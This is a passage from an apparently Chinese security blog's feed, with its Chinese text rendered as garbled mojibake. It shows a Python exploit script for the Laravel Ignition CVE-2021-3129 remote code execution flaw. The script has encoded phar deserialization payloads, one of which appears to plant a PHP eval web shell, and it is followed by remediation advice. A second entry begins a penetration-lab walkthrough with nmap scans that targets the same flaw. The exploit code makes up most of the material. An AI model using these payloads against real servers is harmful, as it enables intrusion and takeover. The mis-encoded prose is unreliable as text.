00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=63=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=48=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=67=00=6E=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=51=00=52=00=44=00=6C=00=33=00=59=00=55=00=68=00=42=00=5A=00=31=00=70=00=59=00=57=00=6D=00=68=00=69=00=51=00=32=00=64=00=72=00=57=00=44=00=46=00=43=00=55=00=46=00=55=00=78=00=55=00=6D=00=4A=00=6B=00=4D=00=6D=00=68=00=32=00=57=00=56=00=63=00=78=00=63=00=46=00=68=00=54=00=61=00=7A=00=64=00=51=00=65=00=6A=00=51=00=39=00=66=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=49=00=43=00=39=00=32=00=59=00=58=00=49=00=76=00=64=00=33=00=64=00=33=00=4C=00=32=00=68=00=30=00=62=00=57=00=77=00=76=00=63=00=32=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=37=00=6D=00=51=00=44=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=6C=00=2B=00=6F=00=79=00=42=00=59=00=69=00=63=00=79=00=37=00=59=00=45=00=58=00=76=00=67=00=50=00=76=00=35=00=2B=00=4D=00=62=00=48=00=55=00=53=00=2B=00=4C=00=63=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">send_poc_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=2B=00=41=00=51=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4B=00=78=00=75=00=41=00=32=00=51=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=4E=00=45=00=5A=00=63=00=6E=00=6D=00=50=00=7A=00=6B=00=72=00=36=00=48=00=4B=00=45=00=64=00=33=00=39=00=49=00=50=00=46=00=6E=00=6A=00=73=00=2B=00=32=00=55=00=6D=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">filter_log</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">phar_ser_linux</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> path<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>        <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span>            <span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">"/storage/logs/laravel.log/test.txt"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token comment"># æŒ‡å®š http å’Œ https èµ°ä»€ä¹ˆä»£ç†</span>        <span class="token string">"http"</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">"https"</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">def</span> <span class="token function">get_path</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxy_server<span class="token punctuation">)</span><span class="token punctuation">:</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'http'</span><span class="token punctuation">:</span> proxy_server<span class="token punctuation">,</span>        <span class="token string">'https'</span><span class="token punctuation">:</span> proxy_server    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\#\d*\ (.*)(?:\/|\\)vendor)'</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ¼æ´æ¢æµ‹ï¼š</li></ul><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.43.23.png" style="zoom:50%;"><ul><li>æœ¨é©¬å†™å…¥</li></ul><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.43.54.png" style="zoom:50%;"><p>æœ¨é©¬å†™å…¥æƒ…å†µï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.42.37.png" style="zoom:50%;"><p>getshellï¼š</p><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.44.59.png" style="zoom:50%;"><img src="/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/%E6%88%AA%E5%B1%8F2025-01-02%2014.45.31.png" style="zoom:50%;"><h1 id="äº”ã€ä¿®å¤æ–¹æ³•"><a href="#äº”ã€ä¿®å¤æ–¹æ³•" class="headerlink" title="äº”ã€ä¿®å¤æ–¹æ³•"></a>äº”ã€ä¿®å¤æ–¹æ³•</h1><ul><li>å»ºè®®å—å½±å“çš„ç”¨æˆ·å°†Laravelæ¡†æ¶å‡çº§è‡³8.4.3åŠä»¥ä¸Šç‰ˆæœ¬ã€‚</li><li>å°†facade ignitionç»„ä»¶å‡çº§è‡³2.5.2åŠä»¥ä¸Šç‰ˆæœ¬ã€‚</li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>CVE-2021-3129æ˜¯ä¸€ä¸ªå½±å“Laravelæ¡†æ¶çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚å½“Laravelå¼€å¯Debugæ¨¡å¼æ—¶ï¼Œç”±äºIgnitionç»„ä»¶å¯¹<code>file_get_contents()</code>å’Œ<code>file_put_contents()</code>å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„Logæ–‡ä»¶ç­‰æ–¹å¼è§¦å‘Pharååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Laravelæ¡†æ¶ç‰ˆæœ¬å°äº8.4.3ä»¥åŠIgnitionç»„ä»¶ç‰ˆæœ¬å°äº2.5.2ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> ååºåˆ—åŒ–æ¼æ´ </tag>
            
            <tag> è¿œç¨‹ä»£ç æ‰§è¡Œ </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> Laravel RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§</title>
      <link href="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/"/>
      <url>/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/</url>
      
        <content type="html"><![CDATA[<p>é¶åœºæ­å»ºçš„å…·ä½“è¿‡ç¨‹è§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹ä¸€æ–‡ã€‚</p><h1 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h1><p>ç›®æ ‡åœ°å€ï¼š192.168.43.253</p><h2 id="1-1-nmapä¿¡æ¯æ”¶é›†"><a href="#1-1-nmapä¿¡æ¯æ”¶é›†" class="headerlink" title="1.1 nmapä¿¡æ¯æ”¶é›†"></a>1.1 nmapä¿¡æ¯æ”¶é›†</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.43.253 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.20.13.png" alt="nmap 192.168.43.253 -sC -sV -T4" style="zoom:40%;"><p>å…¨ç«¯å£æ‰«æï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.43.253 -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.23.49.png" alt="nmap 192.168.43.253 -p- -sC -sV -T4" style="zoom:50%;"><p>ä¸åŠ -p-å‚æ•°æ—¶ï¼Œæ²¡æœ‰æ‰«åˆ°redisçš„6379ç«¯å£ã€‚</p><h2 id="1-2-ä¿¡æ¯åˆ†æ"><a href="#1-2-ä¿¡æ¯åˆ†æ" class="headerlink" title="1.2 ä¿¡æ¯åˆ†æ"></a>1.2 ä¿¡æ¯åˆ†æ</h2><p>80ç«¯å£ï¼šnginx webæœåŠ¡ï¼Œä½†æ˜¯æ ¹æ®è¿”å›çš„ä¿¡æ¯çœ‹ï¼Œ502 bad gatewayï¼Œä¹Ÿæ²¡å•¥åˆ©ç”¨ä»·å€¼ã€‚</p><p>81ç«¯å£ï¼šnginx-webæœåŠ¡ï¼ŒLaravelæ¡†æ¶ï¼Œå¯ä»¥å†æ·±å…¥äº†è§£ç‰ˆæœ¬ä¿¡æ¯ï¼Œå°è¯•è¿›è¡Œå†å²æ¼æ´çš„åˆ©ç”¨ã€‚</p><p>22ç«¯å£ï¼šsshï¼Œå¯ä»¥å°è¯•çˆ†ç ´ã€‚</p><p>6379ç«¯å£ï¼š-redisï¼Œå¯ä»¥å°è¯•æœªæˆæƒè®¿é—®ç­‰å†å²æ¼æ´åˆ©ç”¨ã€‚</p><blockquote><p>Laravelæ¡†æ¶ï¼š</p><p>Laravel æ˜¯ä¸€ä¸ªæµè¡Œçš„ PHP Web åº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œä»¥å…¶ä¼˜é›…ã€ç®€æ´çš„è®¾è®¡å’Œå¼ºå¤§çš„åŠŸèƒ½è€Œå—åˆ°å¼€å‘è€…çš„é’çã€‚å®ƒéµå¾ªæ¨¡å‹-è§†å›¾-æ§åˆ¶å™¨ï¼ˆMVCï¼‰æ¶æ„æ¨¡å¼ï¼Œè‡ª2011å¹´å‘å¸ƒä»¥æ¥ï¼Œå·²ç»æˆä¸º PHP å¼€å‘è€…çš„é¦–é€‰æ¡†æ¶ä¹‹ä¸€ã€‚</p></blockquote><p>è·å–Laravelç‰ˆæœ¬ä¿¡æ¯ï¼šLaravel v8.29.0 (PHP v7.4.14)</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2014.50.51.png" alt="è®¿é—®81ç«¯å£é¦–é¡µè·å–Laravelç‰ˆæœ¬ä¿¡æ¯" style="zoom:80%;"><h1 id="äºŒã€-Laravel-RCE-getshell"><a href="#äºŒã€-Laravel-RCE-getshell" class="headerlink" title="äºŒã€ Laravel RCE-getshell"></a>äºŒã€ Laravel RCE-getshell</h1><h2 id="2-1-æ¼æ´æŸ¥è¯¢"><a href="#2-1-æ¼æ´æŸ¥è¯¢" class="headerlink" title="2.1 æ¼æ´æŸ¥è¯¢"></a>2.1 æ¼æ´æŸ¥è¯¢</h2><p>googleæŸ¥è¯¢ï¼šLaravel v8.29.0 (PHP v7.4.14)ç›¸å…³æ¼æ´ã€‚</p><p>exploit-dbæŸ¥è¯¢ï¼šæ£€ç´¢Laravelçš„å†å²æ¼æ´ï¼ŒLaravel RCE CVE-2021-3129ï¼Œ<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a> ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2024-12-31%2016.07.53.png" style="zoom:50%;"><p>å…·ä½“æ¼æ´å¤ç°è§æœ¬ç«™ã€Š Laravel RCE CVE-2021-3129ã€‹è¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/">https://sxksec.cn/2024/12/31/lou-dong-zhi-shi-ku/laravel-rce-cve-2021-3129/</a>    </p><p>è¿™ç¯‡æ˜¯æœ¬ç«™å…³äºè¯¥æ¼æ´çš„å®Œæ•´å¤ç°ã€åˆ†æå’Œåˆ©ç”¨ç›¸å…³çš„æ–‡ç« ï¼Œä¸‹é¢æ‰€ç”¨åˆ°çš„å…·ä½“çš„expä¹Ÿåœ¨è¿™ç¯‡æ–‡ç« ä¸­ã€‚</p><h2 id="2-2-æ¼æ´æ£€æµ‹"><a href="#2-2-æ¼æ´æ£€æµ‹" class="headerlink" title="2.2 